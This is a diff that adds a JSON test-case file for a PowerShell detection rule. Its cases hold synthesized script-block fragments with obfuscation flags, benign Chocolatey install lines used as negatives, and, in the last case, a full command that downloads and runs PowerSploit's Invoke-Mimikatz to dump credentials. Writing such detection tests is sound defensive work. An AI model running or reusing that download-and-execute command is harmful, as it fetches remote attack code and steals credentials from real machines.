@@ -1,0 +1,12 @@
+{"rule": "ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71", "cases": [
+  {"expect":true,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"[Convert]::FromBase64String -nop  -w   -c  hidden"}},
+  {"expect":true,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"hidden-Enc -w -epbypass"}},
+  {"expect":true,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"iex -nop  -c   -w  -noni New-Object hidden"}},
+  {"expect":true,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":".Download New-Object iex Net.WebClient"}},
+  {"expect":false,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"-nop -w [Convert]::FromBase64String(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1 -c hidden"}},
+  {"expect":false,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{}},
+  {"expect":false,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"-EncWrite-ChocolateyWarninghidden-ep -w bypass"}},
+  {"expect":false,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"-nopiexNew-Object-noni -w (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1 -c hidden"}},
+  {"expect":false,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"New-ObjectWrite-ChocolateyWarningNet.WebClient.Downloadiex"}},
+  {"expect":true,"source":"sigmahq","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"MessageNumber":"1","MessageTotal":"1","Path":"","ScriptBlockId":"bec5c12b-ce56-4e86-9b9b-1e8d0ac37307","ScriptBlockText":"\u0026 {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}"}}
+]}
